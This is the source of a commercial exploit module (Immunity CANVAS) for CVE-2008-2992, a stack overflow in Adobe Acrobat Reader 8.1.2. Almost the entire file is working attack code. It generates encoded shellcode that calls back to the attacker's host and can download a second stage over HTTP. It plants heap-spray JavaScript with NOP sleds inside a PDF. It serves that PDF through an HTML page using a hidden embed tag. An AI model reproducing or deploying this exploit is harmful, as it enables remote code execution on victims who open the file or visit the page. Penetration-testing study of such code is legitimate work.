#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2008
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside

NAME='Adobe Acrobat Reader Stack Overflow (8.1.2)'
DESCRIPTION='Adobe Acrobat Reader Stack Overflow'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Adobe"
DOCUMENTATION['Date public']='11/04/08'
DOCUMENTATION['References']='http://secunia.com/secunia_research/2008-14/'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Adobe Acrobat Reader 8.1.2 and lower'
DOCUMENTATION['CVE Name']='CVE-2008-2992'
DOCUMENTATION['CVE URL']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-2992'
DOCUMENTATION['CERT Advisory']="http://www.kb.cert.org/vuls/id/788019"
DOCUMENTATION['Notes']="Requires a lot of memory (~700MB) to be allocated by the JS engine in order to have our data at 0x30303030."

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP']

NOTES="""
Tested on:
Windows XP Professional SP2 English UP2DATE with Adobe Acrobat Reader 8.1.2

Usage:
./commandlineInterface.py -p 5555 -v 1
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:acrobat_js3 -l 10.10.11.1 -d 5555 -p 8080
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',0],
    1: ['Windows',0]
}

from canvasengine import WIN32MOSDEF
from libs.pyPdf.pdf import *
from libs.pyPdf.generic import *
from libs.pyPdf.filters import *

class theexploit(tcpexploit,httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.clientversion=1
        self.badstring='\0\xff'
        self.name=NAME
        self.htmlfilename='file.html'
        self.pdffilename='file.pdf'
        self.pdfdirectory='Resources/'
        return

    def neededListenerTypes(self):
        return [WIN32MOSDEF]

    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        httpWrapper=''
        try:
            if self.HTTPMOSDEF:
                print '[!] using HTTP MOSDEF tunneling ..'
                sc=shellcodeGenerator.win32()
                sc.addAttr('findeipnoesp',{'subespval':0x1000})
                ssl=''
                sc.addAttr('httpGetShellcode',{'URL':'http://%s%s:%d/w'%(ssl,host,port)})
                httpWrapper=sc.get()
                print '[!] HTTP MOSDEF len: %d bytes'%(len(httpWrapper))
        except:
            httpWrapper=''
        rawshellcode=self.createInjectToSelf(host,port,injectme=httpWrapper,movetostack=True)
        from encoder import chunkedaddencoder
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.shellcode=encoder.encode(rawshellcode)
        return self.shellcode

    def makePDF(self):
        js="""function repeat(count,what) {
          var v = "";
          while (--count >= 0) v += what;
          return v;
}
function exploit() {
var sc = unescape("SHELLCODE");
blah = repeat(128, unescape("%u9090%u9090%u9090%u9090%u9090")) + sc;
bigblock = unescape("%u9090%u9090");
headersize = 20;
wap = headersize+blah.length
while (bigblock.length<wap) bigblock+=bigblock;
fillblock = bigblock.substring(0, wap);
block = bigblock.substring(0, bigblock.length-wap);
while(block.length+wap<0x40000) block = block+block+fillblock;
mm = new Array();
for (i=0;i<1400;i++) mm[i] = block + blah;
var s = util.printf("%2147483647.2147483647f",0);
return s;
}
var inBrowser = this.external;
if (inBrowser)
          var shaft = app.setTimeOut("exploit()",1200);
else

this.setAction("WillClose","exploit()");""".replace('SHELLCODE',urluencode('AAAA'+self.shellcode))
        input=PdfFileReader(file(self.pdfdirectory+'blank.pdf','rb'))
        jsobject=StreamObject()
        jsobject._data=js
        jsdict=input.trailer['/Root']['/Names']['/JavaScript']['/Names'][1].getObject()
        jsdict[NameObject('/JS')]=jsobject.flateEncode()
        page=input.getPage(0)
        output=PdfFileWriter()
        output.addPage(page)
        root=output._root.getObject()
        root.update({NameObject('/Names'):input.trailer['/Root']['/Names']})
        output.write(file(self.pdfdirectory+'temp.pdf','wb'))
        return file(self.pdfdirectory+'temp.pdf','rb').read()

    def makeHTML(self):
        webpage="<HTML>\n"
        webpage+="<EMBED src=\"%s\" HIDDEN=\"TRUE\"></EMBED>\n"%(self.pdffilename)
        webpage+="</HTML>\n"
        return webpage

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file')
            self.createShellcode()
            b.setBody(self.makeHTML())
        elif clientheader.URL.count(self.pdffilename):
            self.log('Serving PDF file')
            self.createShellcode()
            b.setBody(self.makePDF())
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.htmlfilename)
            h.addHeader('Content-Type','binary/octet-stream')
        return h,b

    def getArgs(self):
        self.host=self.target.interface
        self.filename=self.argsDict.get('filename',self.filename)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        filedata=self.makePDF()
        self.log('Opening %s for output'%(self.filename))
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
